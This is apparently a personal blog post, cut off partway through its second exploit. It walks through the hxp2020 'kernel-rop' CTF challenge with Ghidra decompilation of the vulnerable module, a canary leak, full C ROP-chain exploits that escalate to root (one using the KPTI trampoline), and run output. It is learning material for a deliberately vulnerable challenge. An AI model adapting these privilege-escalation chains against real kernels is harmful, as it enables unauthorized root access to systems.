<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>kernel rop | papichulo16</title>
  <link rel="stylesheet" href="/assets/css/style.css">
  
</head>
<body>
  <nav class="navbar">
    <a class="menu home-link" href="https://github.com/papichulo16"><img src="/assets/img/chavo.png" alt="gh pfp" class="pfp-img">GitHub</a>

    <div class="nav-right">
      <a href="/">Home</a>
      <a href="/contact">Contact</a>
      <a href="/reviews">Reviews</a>
      <a href="/blogs">Blogs</a>
      <div class="dropdown">
        <span><a href="/projects">Projects ▾</a></span>
        <div class="dropdown-content">
          
            <a href="/projects/1_magical_kernel.html">Magical Kernel (blogs)</a>
          
            <a href="/projects/3_ctf_writeups.html">PWN Writeups (blogs)</a>
          
            <a href="/projects/4_crap.html">C.R.A.P</a>
          
        </div>
      </div>
    </div>
  </nav>
  <hr>

  <main>
    <article class="blog-post">
  <h1>kernel rop</h1>
  <p class="post-date">December 20, 2024</p>

  <div class="post-content">
    <p><a href="https://github.com/papichulo16/ctf-stuff/tree/main/learning_kernel_stuff">source</a></p>

<h3 id="prologue">Prologue</h3>

<p>I am currently in winter break and extremely bored so I decided to start this kind of blog-like thing while I learn kernel stuff because this will keep me accountable and I will really have to understand the topic to be able to write about it. Also I am doing some hardware hacking stuff as well so I might start one for that too. I will keep all references where I learned from down at the bottom.</p>

<p>To be honest kernel exploitation always seemed so daunting and scary because of so many things, but one I had to learn how a kernel works to an extent hahahaha. I did watch a few videos and learned a bit on the ways that a kernel works, also from watching in depth videos on meltdown helped, so I kind of have enough of an understanding to begin learning kernel exploitation and just learn about operating systems along the way. So I hope you enjoy.</p>

<h3 id="the-beginning">The Beginning</h3>

<p>So to start this, like almost everyone that wanted to learn kernel exploitation, I started with the kernel-rop challenge from hxp2020 CTF. I will start by disabling all kernel mitigations and then slowly adding them on one-by-one.</p>

<p>So when I got the challenge I had a compressed file system under the name of <code class="language-plaintext highlighter-rouge">initramfs.cpio.gz</code> and after decompressing it, I got the file system. Now when I want to add something all I have to do is decompress it, add whatever file I want to be in there, compress it, and then run the <code class="language-plaintext highlighter-rouge">run.sh</code> file to start the VM instance; and that is how I would add my exploits.</p>

<p>Not just that, but I also got a kernel image under the name of <code class="language-plaintext highlighter-rouge">vmlinuz</code>, so all I did was extract the image and I would be able to run ROPgadget or ropper to get gadgets or whatnot and then sent them to a .txt file because it takes a while to search for gadgets. Also all of these scripts come from <a href="https://github.com/SolarDebris/stuff">my friend Alex’s stuff repo</a>.</p>

<p>With this in mind I could finally get started.</p>

<h3 id="mitigations">Mitigations</h3>

<p>There are a few kernel exploit mitigations, and to be honest, they are very similar to their userland equivalents.</p>
<ul>
  <li>KASLR: Basically the same as the userland equivalent, ASLR.</li>
  <li>FG-KASLR: It randomizes kernel space addresses every time on boot. There are some exceptions though (will go into it later on).</li>
  <li>SMEP/SMAP: Together they mark all userland pages as non RWX.</li>
  <li>KPTI: Separates userland and kernel page tables. Also minimizes the kernel page table that can be viewed when in user mode (I am oversimplifying it for my current understanding, usually I pick things up as I go instead of fully understanding everything before starting something).</li>
</ul>

<h3 id="the-goal">The Goal</h3>

<p>The goal for kernel exploitation as a whole is not to get shell like in userland exploits, but instead your goal is to go from user privilages to root privilages—legit just turning one number into a 0. I don’t know much about other exploit techniques so far but I can say that for ret2usr these will be our goals:</p>
<ul>
  <li>First we must save the program state.</li>
  <li>Leak kernel stack cookie.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">prepare_kernel_cred(0)</code> since this will get us ready to get root, it will return a value that will be sent into another function later.</li>
  <li>Call <code class="language-plaintext highlighter-rouge">commit_creds(param)</code> with the parameter returned by the <code class="language-plaintext highlighter-rouge">prepare_kernel_cred()</code> function.</li>
  <li>After this we must switch back into user mode. To do so we first have to call <code class="language-plaintext highlighter-rouge">swapgs</code> which will swap the value of the <code class="language-plaintext highlighter-rouge">gs</code> register to a memory location in user space.</li>
  <li>Then call either <code class="language-plaintext highlighter-rouge">iretq</code> or <code class="language-plaintext highlighter-rouge">sysretq</code> to actually make the switch between kernel and user. <code class="language-plaintext highlighter-rouge">iretq</code> is the simpler of the two, all it will do is populate <code class="language-plaintext highlighter-rouge">rip</code>, <code class="language-plaintext highlighter-rouge">cs</code>, <code class="language-plaintext highlighter-rouge">rflags</code>, <code class="language-plaintext highlighter-rouge">rsp</code>, and <code class="language-plaintext highlighter-rouge">ss</code> in that order, so you must put those values on the stack in reverse order. <code class="language-plaintext highlighter-rouge">sysretq</code> needs less registers but has stricter rules, it will move the value in <code class="language-plaintext highlighter-rouge">rcx</code> to <code class="language-plaintext highlighter-rouge">rip</code>, <code class="language-plaintext highlighter-rouge">rflags</code> to <code class="language-plaintext highlighter-rouge">r11</code>, and it requires bits 48-63 to be identical to bit 47 for <code class="language-plaintext highlighter-rouge">rip</code>.</li>
  <li>Once you are finally in userland, all you have to do is call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> and BAM, you got root.</li>
</ul>

<h3 id="starting-the-exploit">Starting The Exploit</h3>

<h4 id="getting-the-stack-cookie">Getting the stack cookie</h4>

<p>So when I first started, I only had SMEP and SMAP on because in reality it is the same as without but the only difference is that instead of writing assembly you just have to write that inside a ROP chain. First let’s look at the vulnerable module though.</p>

<p>The vulnerable module named <code class="language-plaintext highlighter-rouge">hackme.ko</code> has 6 functions: <code class="language-plaintext highlighter-rouge">hackme_open</code>, <code class="language-plaintext highlighter-rouge">hackme_init</code>, <code class="language-plaintext highlighter-rouge">hackme_exit</code>, and <code class="language-plaintext highlighter-rouge">hackme_release</code> are just here to initialize the module so that leaves <code class="language-plaintext highlighter-rouge">hackme_read</code> and <code class="language-plaintext highlighter-rouge">hackme_write</code> to be our vulnerable functions. Here is the Ghidra decompilation for both:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">ssize_t</span> <span class="nf">hackme_read</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">tmp</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  
  <span class="n">tmp</span><span class="p">.</span><span class="n">_120_8_</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="n">__memcpy</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">local_a8</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__warn_printk</span><span class="p">(</span><span class="s">"Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">invalidInstructionException</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="n">__check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
  <span class="n">lVar1</span> <span class="o">=</span> <span class="n">_copy_to_user</span><span class="p">(</span><span class="n">data</span><span class="p">,</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
  <span class="n">sVar2</span> <span class="o">=</span> <span class="mh">0xfffffffffffffff2</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">sVar2</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">_120_8_</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">sVar2</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="p">}</span>

<span class="kt">ssize_t</span> <span class="nf">hackme_write</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">f</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span><span class="kt">size_t</span> <span class="n">size</span><span class="p">,</span><span class="n">loff_t</span> <span class="o">*</span><span class="n">off</span><span class="p">)</span>

<span class="p">{</span>
  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
  <span class="kt">long</span> <span class="n">in_GS_OFFSET</span><span class="p">;</span>
  <span class="n">undefined</span> <span class="n">local_a8</span> <span class="p">[</span><span class="mi">8</span><span class="p">];</span>
  <span class="kt">int</span> <span class="n">tmp</span> <span class="p">[</span><span class="mi">32</span><span class="p">];</span>
  
  <span class="n">tmp</span><span class="p">.</span><span class="n">_120_8_</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">undefined8</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="mh">0x1000</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__warn_printk</span><span class="p">(</span><span class="s">"Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="mh">0x1000</span><span class="p">);</span>
    <span class="k">do</span> <span class="p">{</span>
      <span class="n">invalidInstructionException</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
  <span class="p">}</span>
  <span class="n">__check_object_size</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">size</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
  <span class="n">lVar1</span> <span class="o">=</span> <span class="n">_copy_from_user</span><span class="p">(</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">data</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">__memcpy</span><span class="p">(</span><span class="n">local_a8</span><span class="p">,</span><span class="n">hackme_buf</span><span class="p">,</span><span class="n">size</span><span class="p">);</span>
  <span class="p">}</span>
  <span class="k">else</span> <span class="p">{</span>
    <span class="n">size</span> <span class="o">=</span> <span class="mh">0xfffffffffffffff2</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">tmp</span><span class="p">.</span><span class="n">_120_8_</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_GS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
    <span class="k">return</span> <span class="n">size</span><span class="p">;</span>
  <span class="p">}</span>
                    <span class="cm">/* WARNING: Subroutine does not return */</span>
  <span class="n">__stack_chk_fail</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div></div>

<p>You can find the bug for yourself, it is kind of obvious. Just know that the <code class="language-plaintext highlighter-rouge">hackme_buf</code> is the actual buffer you use in userland when you call the <code class="language-plaintext highlighter-rouge">read</code> or <code class="language-plaintext highlighter-rouge">write</code> functions.</p>

<p>So to get started we must first get a kernel cookie leak and to do so we will take advantage of the <code class="language-plaintext highlighter-rouge">hackme_read</code> function. All it is doing is reading too much data from the kernel space’s <code class="language-plaintext highlighter-rouge">tmp</code> buffer to the point where there is a leak, and after looking through and running the program you can tell that the stack cookie is on index 16:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0xb998bada295df400
[*] Leak at index 3: 0xffff888006890310
[*] Leak at index 4: 0xffffc900001bfe68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff888006890300
[*] Leak at index 7: 0xffffc900001bfef0
[*] Leak at index 8: 0xffff888006890300
[*] Leak at index 9: 0xffffc900001bfe80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff888006890300
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7fff4045dd50
[*] Leak at index 15: 0xffffc900001bfea0
[*] Leak at index 16: 0xb998bada295df400 &lt;=====
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001bfed8
[*] Canary value: 0xb998bada295df400
</code></pre></div></div>

<p>Also here is the code that made that:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">leak_canary</span> <span class="p">()</span> <span class="p">{</span>
	<span class="c1">// unsigned longs are 8 bytes each, buf is 0x80 bytes large</span>
	<span class="c1">// so canary will be at index 16</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">leak</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>

	<span class="kt">int</span> <span class="n">sz</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">kernel_fd</span><span class="p">,</span> <span class="n">leak</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">leak</span><span class="p">));</span>

	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">20</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Leak at index %d: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">leak</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>	
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Canary value: 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">]);</span>

	<span class="k">return</span> <span class="n">leak</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
<span class="p">}</span>
</code></pre></div></div>

<h4 id="exploit-one">Exploit one</h4>

<p>Now that there is a canary leak, now we can get started with the actual exploit. First I will need to get the gadgets and addresses that I will use for this exploit. To get the addresses you will need to first go in <code class="language-plaintext highlighter-rouge">/etc/init.d/rcS</code> and write <code class="language-plaintext highlighter-rouge">setuidgid 0 /bin/sh</code> at the bottom so when you spawn into the instance you already have root. Next start the instance and cat out the file at <code class="language-plaintext highlighter-rouge">/proc/kallsyms</code> while grepping for whatever kernel function you need. Once you do that, just remove the line you wrote in <code class="language-plaintext highlighter-rouge">/etc/init.d/rcS</code> so you are not automatically spawned as root and you can see if your exploit works. Here are the addresses I used:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0xffffffff81006370</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">mov_rdi_rax_pop_rbp</span> <span class="o">=</span> <span class="mh">0xffffffff816bf203</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">swapgs_pop_rbp</span> <span class="o">=</span> <span class="mh">0xffffffff8100a55f</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">iretq_pop_rbp</span> <span class="o">=</span> <span class="mh">0xffffffff814381cb</span><span class="p">;</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="mh">0xffffffff814c6410</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="mh">0xffffffff814c67f0</span><span class="p">;</span>
</code></pre></div></div>

<p>Next all I needed to do is save the current state and then create a ROP chain doing what I said to do inside the Goal section.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_cs</span><span class="p">,</span> <span class="n">user_ss</span><span class="p">,</span> <span class="n">user_rflags</span><span class="p">,</span> <span class="n">user_sp</span><span class="p">;</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">user_rip</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span> <span class="n">shell</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">shell</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">int</span> <span class="n">uid</span> <span class="o">=</span> <span class="n">getuid</span><span class="p">();</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] uid: %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">uid</span><span class="p">);</span>
	<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Spawning shell."</span><span class="p">);</span>
	<span class="n">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// open the vulnerable kernel module</span>
<span class="kt">void</span> <span class="nf">open_ko_file</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">kernel_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/dev/hackme"</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>

	<span class="k">if</span> <span class="p">(</span><span class="n">kernel_fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">printf</span><span class="p">(</span><span class="s">"[!] Error opening kernel module</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
		<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">printf</span><span class="p">(</span><span class="s">"[*] Opened module</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">save_state</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">__asm__</span><span class="p">(</span><span class="s">".intel_syntax noprefix;"</span>
            <span class="s">"mov user_cs, cs;"</span>
            <span class="s">"mov user_ss, ss;"</span>
            <span class="s">"mov user_sp, rsp;"</span>
            <span class="s">"pushf;"</span>
            <span class="s">"pop user_rflags;"</span>
            <span class="s">".att_syntax"</span><span class="p">);</span>
    <span class="n">puts</span><span class="p">(</span><span class="s">"[+] Saved state"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">overflow</span> <span class="p">()</span> <span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">();</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop_rbp</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_pop_rbp</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">iretq_pop_rbp</span><span class="p">;</span>
    <span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rflags</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_sp</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_ss</span><span class="p">;</span>

	<span class="n">puts</span><span class="p">(</span><span class="s">"[*] Sending payload..."</span><span class="p">);</span>
	
	<span class="kt">ssize_t</span> <span class="n">w</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">kernel_fd</span><span class="p">,</span> <span class="n">payload</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">));</span>

	<span class="n">puts</span><span class="p">(</span><span class="s">"[!] This should never be reached"</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
	<span class="n">save_state</span><span class="p">();</span>
	<span class="n">open_ko_file</span><span class="p">();</span>
	<span class="n">overflow</span><span class="p">();</span>

	<span class="n">puts</span><span class="p">(</span><span class="s">"[!] Something went wrong"</span><span class="p">);</span>
	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>

<p>And just like that when you run it you get root!</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/ $ ./exploit_one
[+] Saved state
[*] Opened module
[*] Leak at index 0: 0xffffffff81a29330
[*] Leak at index 1: 0x12
[*] Leak at index 2: 0x4470b02040fd00
[*] Leak at index 3: 0xffff88800689a410
[*] Leak at index 4: 0xffffc900001c7e68
[*] Leak at index 5: 0x4
[*] Leak at index 6: 0xffff88800689a400
[*] Leak at index 7: 0xffffc900001c7ef0
[*] Leak at index 8: 0xffff88800689a400
[*] Leak at index 9: 0xffffc900001c7e80
[*] Leak at index 10: 0xffffffff8184e047
[*] Leak at index 11: 0xffffffff8184e047
[*] Leak at index 12: 0xffff88800689a400
[*] Leak at index 13: 0x0
[*] Leak at index 14: 0x7ffc30eeb850
[*] Leak at index 15: 0xffffc900001c7ea0
[*] Leak at index 16: 0x4470b02040fd00
[*] Leak at index 17: 0xa0
[*] Leak at index 18: 0x0
[*] Leak at index 19: 0xffffc900001c7ed8
[*] Canary value: 0x4470b02040fd00
[*] Sending payload...
[*] uid: 0
[*] Spawning shell.
/ # id
uid=0 gid=0
/ # 
</code></pre></div></div>

<h3 id="exploit-two">Exploit Two</h3>

<p>For this exploit, I have added KPTI protections. To be honest there is not that much of a difference for the technique that I used, KPTI trampoline.</p>

<p>Literally all it is is that now we remove our swapgs and iretq gadgets into calling the nice and short named symbol, <code class="language-plaintext highlighter-rouge">swapgs_restore_regs_and_return_to_usermode</code>. This symbol has a bunch of <code class="language-plaintext highlighter-rouge">pop</code> instructions at first but then after 22 bytes the original symbol there is this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	 * mov rdi, rsp
	 * mov rsp, gs
	 * push [rdi + 0x30]
	 * push [rdi + 0x28]
	 * push [rdi + 0x20]
	 * push [rdi + 0x18]
	 * push [rdi + 0x10]
	 * push [rdi]
	 * push rax
	 * jmp swapgs
</code></pre></div></div>

<p>And inside the swapgs address there will be this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>     * pop rax
	 * pop rdi
	 * call swapgs
	 * jmp iretq
</code></pre></div></div>

<p>Legit this makes it even easier compared to before. So now all you need to do is implement it into a ROP chain.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">void</span> <span class="nf">overflow</span> <span class="p">()</span> <span class="p">{</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">payload</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
	<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>

	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">leak_canary</span><span class="p">();</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbx</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// r12</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// rbp</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pop_rdi</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">prepare_kernel_cred</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">mov_rdi_rax_pop_rbp</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">commit_creds</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">swapgs_restore_regs_and_return_to_usermode</span> <span class="o">+</span> <span class="mi">22</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// pop rax</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x0</span><span class="p">;</span> <span class="c1">// pop rdi</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_rip</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
	<span class="n">payload</span><span class="p">[</span><span class="n">offset</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">user_cs</span><span class="p">;</span>
